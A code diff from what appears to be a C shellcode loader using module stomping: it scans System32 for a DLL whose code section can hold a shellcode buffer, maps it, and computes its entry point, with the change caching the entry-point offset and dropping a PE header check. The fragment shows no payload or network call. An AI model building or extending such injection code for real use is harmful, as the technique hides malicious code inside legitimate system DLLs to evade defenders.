@@ -53,6 +53,7 @@ int main()
 	unsigned long		ulFileSize,
 						ulOldProtection,
 						ulThreadId,
+						ulEntry,
 						ulBytesRead;
 	int					Sys32Length				= lstrlen( L"C:\\Windows\\System32\\" );
 	long				Status;
@@ -119,6 +120,7 @@ int main()
 		*/
 		if ( NtHeader->OptionalHeader.SizeOfCode >= sizeof( shellcode ) )
 		{
+			ulEntry = NtHeader->OptionalHeader.AddressOfEntryPoint;
 			msg( L"Found suitable dll for the shellcode.\n\t> DLL: %s\n\t> Text section size: %d\n\t> Shellcode Size: %zd", FileData.cFileName, NtHeader->OptionalHeader.SizeOfCode, sizeof( shellcode ) );
 			break;
 		}
@@ -150,13 +152,7 @@ int main()
 	/* 
 		Step 3: Locate the entry point of the newly loaded dll 
 	*/
-	DosHeader = ( PIMAGE_DOS_HEADER )pTargetDll;
-	NtHeader  = ( PIMAGE_NT_HEADERS )( ( unsigned long long )pTargetDll + DosHeader->e_lfanew );
-	if ( DosHeader->e_magic != IMAGE_DOS_SIGNATURE || NtHeader->Signature != IMAGE_NT_SIGNATURE )
-	{
-		api_ferror( "N/A", "Could not validate PE headers for %s\n", FileData.cFileName );
-	}
-	pTargetDllEntry = ( void* )( ( unsigned long long )pTargetDll + NtHeader->OptionalHeader.AddressOfEntryPoint );
+	pTargetDllEntry = ( void* )( ( unsigned long long )pTargetDll + ulEntry );
 	msg( "Mapped %s to image section.\n\t> Base: 0x%p\n\t> Entry: 0x%p", FileData.cFileName, pTargetDll, pTargetDllEntry );
 
 	
